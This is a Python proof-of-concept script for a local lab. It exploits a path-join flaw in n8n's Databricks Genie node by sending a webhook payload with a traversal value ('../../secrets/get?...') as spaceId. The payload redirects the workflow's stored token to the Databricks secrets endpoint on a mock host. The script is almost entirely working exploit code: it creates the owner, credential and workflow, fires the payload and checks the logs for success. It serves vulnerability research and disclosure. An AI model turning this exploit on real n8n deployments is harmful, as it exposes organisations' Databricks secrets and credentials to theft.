#!/usr/bin/env python3
"""Prove n8n Databricks Genie get-space concatenates spaceId without toPathSegment.

Attacker POSTs a public webhook that binds spaceId to
``../../secrets/get?scope=s&key=k``. n8n's HTTP client (WHATWG URL) normalizes
``..`` and splits ``?``, so the workflow token hits GET /api/2.0/secrets/get
on the mock Databricks host.

Loopback only. Dummy token. No shells. LangChain VectorStoreDatabricks
negative (encoded path via toPathSegment) is not wired.
"""
from __future__ import annotations

import http.cookiejar
import json
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.request
from dataclasses import dataclass
from pathlib import Path

LABEL = "N8N-DBX-PATH-JOIN"
WITNESS = "N8N-DBX-SECRET-WITNESS"
DEFAULT_N8N = "http://127.0.0.1:18202"
DEFAULT_MOCK = "http://127.0.0.1:18203"
EXPECTED_VERSION = "2.42.0"
N8N_CONTAINER = "n8n-databricks-path-join-n8n-1"
OWNER_EMAIL = "labadmin@localhost.invalid"
OWNER_PASSWORD = "LabPass123!"
PAYLOAD_SPACE = "../../secrets/get?scope=s&key=k"
WEBHOOK_PATH = "dbx-space"
SECRET_PATH = "/api/2.0/secrets/get"
USER_AGENT = "n8n-databricks-path-join-lab"
CREDENTIAL_NAME = "Databricks mock"
CREDENTIAL_HOST = "http://mock:8080"
CREDENTIAL_TOKEN = "dapi-lab-dummy-token"
WEBHOOK_ID = "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"
WEBHOOK_NODE_ID = "11111111-1111-4111-8111-111111111111"
GENIE_NODE_ID = "22222222-2222-4222-8222-222222222222"


class LabError(RuntimeError):
    """FAIL token already printed."""


@dataclass(frozen=True)
class Config:
    n8n: str
    mock: str
    lab_dir: Path


class CookieClient:
    def __init__(self) -> None:
        jar = http.cookiejar.CookieJar()
        ctx = ssl._create_unverified_context()
        self._opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(jar),
            urllib.request.HTTPSHandler(context=ctx),
        )

    def http(
        self,
        method: str,
        url: str,
        data: object | None = None,
        headers: dict[str, str] | None = None,
        timeout: int = 60,
    ) -> tuple[int, str, dict[str, str]]:
        hdrs = {"User-Agent": USER_AGENT, "Accept": "application/json"}
        if headers:
            hdrs.update(headers)
        body: bytes | None = None
        if data is not None:
            body = json.dumps(data).encode("utf-8")
            hdrs.setdefault("Content-Type", "application/json")
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        try:
            with self._opener.open(req, timeout=timeout) as resp:
                text = resp.read().decode("utf-8", "replace")
                return resp.status, text, {k.lower(): v for k, v in resp.headers.items()}
        except urllib.error.HTTPError as exc:
            text = exc.read().decode("utf-8", "replace")
            return exc.code, text, {k.lower(): v for k, v in exc.headers.items()}


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> None:
    log(reason)
    log(f"FAIL {LABEL}")
    raise LabError(reason)


def unwrap(text: str) -> object:
    try:
        obj = json.loads(text)
    except json.JSONDecodeError:
        return text
    if isinstance(obj, dict) and "data" in obj:
        return obj["data"]
    return obj


def compose(cfg: Config, *args: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", *args],
        cwd=cfg.lab_dir,
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )


def confirm_n8n_version(cfg: Config) -> str:
    inspect = subprocess.run(
        [
            "docker",
            "inspect",
            "-f",
            '{{.Config.Image}} {{index .Config.Labels "org.opencontainers.image.version"}} {{range .Config.Env}}{{println .}}{{end}}',
            N8N_CONTAINER,
        ],
        capture_output=True,
        text=True,
        timeout=30,
        check=False,
    )
    blob = (inspect.stdout or "") + (inspect.stderr or "")
    env = compose(cfg, "exec", "-T", "n8n", "printenv", "N8N_VERSION")
    version = (env.stdout or "").strip()
    if not version:
        for line in blob.splitlines():
            if line.startswith("N8N_VERSION="):
                version = line.split("=", 1)[1].strip()
                break
    log(f"IOC n8n-image={blob.splitlines()[0] if blob.strip() else 'unknown'}")
    log(f"IOC n8n-version={version or 'unknown'}")
    if version and version != EXPECTED_VERSION:
        fail(f"expected n8n {EXPECTED_VERSION}, got {version}")
    if EXPECTED_VERSION not in blob and version != EXPECTED_VERSION:
        # Image tag is the pin when the container omits N8N_VERSION.
        img = compose(cfg, "images", "n8n", "--format", "{{.Tag}}")
        tag = (img.stdout or "").strip()
        log(f"IOC n8n-tag={tag}")
        if tag and tag != EXPECTED_VERSION:
            fail(f"expected image tag {EXPECTED_VERSION}, got {tag}")
    return version or EXPECTED_VERSION


def setup_owner(client: CookieClient, cfg: Config) -> None:
    last = ""
    for i in range(30):
        code, text, _ = client.http(
            "POST",
            f"{cfg.n8n}/rest/owner/setup",
            {
                "email": OWNER_EMAIL,
                "firstName": "Lab",
                "lastName": "Admin",
                "password": OWNER_PASSWORD,
            },
        )
        last = f"{code} {text[:300]}"
        if code in (200, 201):
            log("IOC owner-setup=ok")
            return
        if code == 400 and "already" in text.lower():
            log("IOC owner-already-setup")
            return
        if code in (404, 502, 503):
            log(f"IOC owner-setup-wait i={i} http={code}")
            time.sleep(2)
            continue
        fail(f"owner setup failed: {last}")
    fail(f"owner setup not ready: {last}")


def login(client: CookieClient, cfg: Config) -> None:
    code, text, _ = client.http(
        "POST",
        f"{cfg.n8n}/rest/login",
        {"emailOrLdapLoginId": OWNER_EMAIL, "password": OWNER_PASSWORD},
    )
    if code != 200:
        fail(f"login failed: {code} {text[:300]}")
    log("IOC login=ok")


def create_credential(client: CookieClient, cfg: Config) -> tuple[str, str]:
    code, text, _ = client.http(
        "POST",
        f"{cfg.n8n}/rest/credentials",
        {
            "name": CREDENTIAL_NAME,
            "type": "databricksApi",
            "data": {
                "host": CREDENTIAL_HOST,
                "token": CREDENTIAL_TOKEN,
            },
        },
    )
    if code not in (200, 201):
        fail(f"create credential failed: {code} {text[:400]}")
    data = unwrap(text)
    if not isinstance(data, dict) or not data.get("id"):
        fail(f"credential response missing id: {text[:400]}")
    cred_id = str(data["id"])
    cred_name = str(data.get("name") or CREDENTIAL_NAME)
    log(f"IOC credential-id={cred_id}")
    return cred_id, cred_name


def _workflow_body(cred_id: str, cred_name: str) -> dict[str, object]:
    return {
        "name": "dbx-genie-space-webhook",
        "nodes": [
            {
                "parameters": {
                    "httpMethod": "POST",
                    "path": WEBHOOK_PATH,
                    "responseMode": "lastNode",
                    "responseData": "firstEntryJson",
                    "options": {},
                },
                "id": WEBHOOK_NODE_ID,
                "name": "Webhook",
                "type": "n8n-nodes-base.webhook",
                "typeVersion": 2.2,
                "position": [0, 0],
                "webhookId": WEBHOOK_ID,
            },
            {
                "parameters": {
                    "authentication": "accessToken",
                    "resource": "genie",
                    "operation": "getSpace",
                    "spaceId": "={{ $json.body.spaceId }}",
                },
                "id": GENIE_NODE_ID,
                "name": "Get Space",
                "type": "n8n-nodes-base.databricks",
                "typeVersion": 1,
                "position": [280, 0],
                "credentials": {
                    "databricksApi": {
                        "id": cred_id,
                        "name": cred_name,
                    }
                },
            },
        ],
        "connections": {
            "Webhook": {
                "main": [[{"node": "Get Space", "type": "main", "index": 0}]]
            }
        },
        "settings": {"executionOrder": "v1"},
        "pinData": {},
        "meta": None,
    }


def create_workflow(
    client: CookieClient, cfg: Config, cred_id: str, cred_name: str
) -> tuple[str, str]:
    code, text, _ = client.http(
        "POST", f"{cfg.n8n}/rest/workflows", _workflow_body(cred_id, cred_name)
    )
    if code not in (200, 201):
        fail(f"create workflow failed: {code} {text[:500]}")
    data = unwrap(text)
    if not isinstance(data, dict) or not data.get("id") or not data.get("versionId"):
        fail(f"workflow response missing ids: {text[:500]}")
    wf_id = str(data["id"])
    version_id = str(data["versionId"])
    log(f"IOC workflow-id={wf_id}")
    log(f"IOC version-id={version_id}")
    return wf_id, version_id


def activate(client: CookieClient, cfg: Config, wf_id: str, version_id: str) -> None:
    code, text, _ = client.http(
        "POST",
        f"{cfg.n8n}/rest/workflows/{wf_id}/activate",
        {"versionId": version_id},
    )
    if code not in (200, 201):
        fail(f"activate workflow failed: {code} {text[:500]}")
    log("IOC workflow-active=ok")


def mock_logs(client: CookieClient, cfg: Config) -> str:
    code, text, _ = client.http("GET", f"{cfg.mock}/__logs", timeout=10)
    if code != 200:
        return f"(mock logs http={code} body={text[:200]})"
    return text


def attack(client: CookieClient, cfg: Config) -> tuple[int, str]:
    last = (0, "")
    for i in range(20):
        code, text, _ = client.http(
            "POST",
            f"{cfg.n8n}/webhook/{WEBHOOK_PATH}",
            {"spaceId": PAYLOAD_SPACE},
            timeout=90,
        )
        last = (code, text)
        log(f"IOC webhook-http={code} attempt={i} body={text[:400]!r}")
        if code != 404:
            return last
        time.sleep(1)
    return last


def path_escaped(logs: str) -> bool:
    return (
        "..%2F" in logs
        or "%2e%2e" in logs.lower()
        or "/genie/spaces/..%2F" in logs
        or "/genie/spaces/%2e%2e" in logs.lower()
    )


def _request_target(line: str) -> str:
    return line[4:].split(" ", 1)[0]


def secrets_get_hit(logs: str) -> bool:
    for line in logs.splitlines():
        if not line.startswith("GET "):
            continue
        path = _request_target(line).split("?", 1)[0]
        if path.rstrip("/") == SECRET_PATH:
            return True
    return False


def stayed_in_genie(logs: str) -> bool:
    interesting = [
        ln
        for ln in logs.splitlines()
        if ln.startswith(("GET ", "POST ", "PUT ", "HEAD "))
        and "/__logs" not in ln
        and "/health" not in ln
    ]
    if not interesting:
        return True
    return all("/genie/spaces/" in ln for ln in interesting)


def secret_request_line(logs: str) -> str:
    for line in logs.splitlines():
        if not line.startswith("GET "):
            continue
        path = _request_target(line).split("?", 1)[0]
        if path.rstrip("/") == SECRET_PATH:
            return line
    return f"GET {SECRET_PATH}"


def parse_config(argv: list[str]) -> Config:
    n8n = (argv[1] if len(argv) > 1 else DEFAULT_N8N).rstrip("/")
    mock = (argv[2] if len(argv) > 2 else DEFAULT_MOCK).rstrip("/")
    return Config(n8n=n8n, mock=mock, lab_dir=Path(__file__).resolve().parent)


def run_lab(cfg: Config) -> int:
    client = CookieClient()
    log("IOC langchain-negative=skipped VectorStoreDatabricks uses toPathSegment; not wired")
    confirm_n8n_version(cfg)
    setup_owner(client, cfg)
    login(client, cfg)
    cred_id, cred_name = create_credential(client, cfg)
    wf_id, version_id = create_workflow(client, cfg, cred_id, cred_name)
    activate(client, cfg, wf_id, version_id)
    time.sleep(1)
    _code, body = attack(client, cfg)
    logs = mock_logs(client, cfg)
    log("IOC mock-access-log<<<")
    log(logs.rstrip() or "(empty)")
    log("IOC mock-access-log>>>")

    body_has_witness = WITNESS in body
    log(f"IOC webhook-witness={body_has_witness}")
    log(f"IOC mock-secrets-get={secrets_get_hit(logs)}")

    if path_escaped(logs):
        fail("path kept encoded under /genie/spaces/")
    if not secrets_get_hit(logs) and not body_has_witness:
        if stayed_in_genie(logs):
            fail("n8n never left /api/2.0/genie/spaces/")
        fail("no GET /api/2.0/secrets/get and no witness in webhook body")

    log(f"IOC mock-request-line={secret_request_line(logs)}")
    log(f"IOC witness={WITNESS}")
    log(f"SUCCESS {LABEL}")
    return 0


def main() -> int:
    try:
        return run_lab(parse_config(sys.argv))
    except LabError:
        return 1
    except Exception as exc:
        log(f"{type(exc).__name__}: {exc}")
        log(f"FAIL {LABEL}")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
